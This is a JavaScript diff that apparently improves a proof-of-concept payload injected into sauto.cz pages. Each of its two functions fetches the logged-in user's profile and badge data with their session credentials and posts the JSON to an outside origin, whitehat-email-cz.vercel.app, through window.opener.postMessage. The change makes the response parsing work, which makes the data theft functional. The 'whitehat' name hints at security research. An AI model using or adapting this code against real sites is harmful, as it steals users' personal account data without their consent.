@@ -18,33 +18,50 @@ setInterval(() => {
 }, 0);
 
 (function getUsersSelfData() {
-    fetch('https://www.sauto.cz/api/v1/users/self', {
-        method: "GET",
-        credentials: "same-origin",
-    }).then((response) => {
-        console.log(response);
-        window.opener.postMessage({
-            messageType: 'getUsersSelfData',
-            response: response.data
-        }, 'https://whitehat-email-cz.vercel.app/');
-        getUsersSelfDataComplete = true;
-    }).catch(error => {
-        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
-    });
+    fetch(
+        'https://www.sauto.cz/api/v1/users/self',
+        {
+            method: "GET",
+            credentials: "same-origin",
+            headers: {
+                'Accept': 'application/json',
+            },
+        },
+    )
+        .then(response => response.json())
+        .then((json) => {
+            window.opener.postMessage({
+                messageType: 'getUsersSelfData',
+                response: json
+            }, 'https://whitehat-email-cz.vercel.app/');
+            getUsersSelfDataComplete = true;
+        })
+        .catch(error => {
+            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        });
 })();
 
 (function getUserBadgeData() {
-    fetch('https://login.sauto.cz/api/v1/user/badge?service=sauto', {
-        method: "GET",
-        credentials: "same-origin",
-    }).then((response) => {
-        window.opener.postMessage({
-            messageType: 'getUserBadgeData',
-            response: response.data
-        }, 'https://whitehat-email-cz.vercel.app/');
-        getUserBadgeDataComplete = true;
-    }).catch(error => {
-        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
-    });
+    fetch(
+        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
+        {
+            method: "GET",
+            credentials: "same-origin",
+            headers: {
+                'Accept': 'application/json',
+            },
+        },
+    )
+        .then(response => response.json())
+        .then((json) => {
+            window.opener.postMessage({
+                messageType: 'getUserBadgeData',
+                response: json
+            }, 'https://whitehat-email-cz.vercel.app/');
+            getUserBadgeDataComplete = true;
+        })
+        .catch(error => {
+            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        });
 })();
 
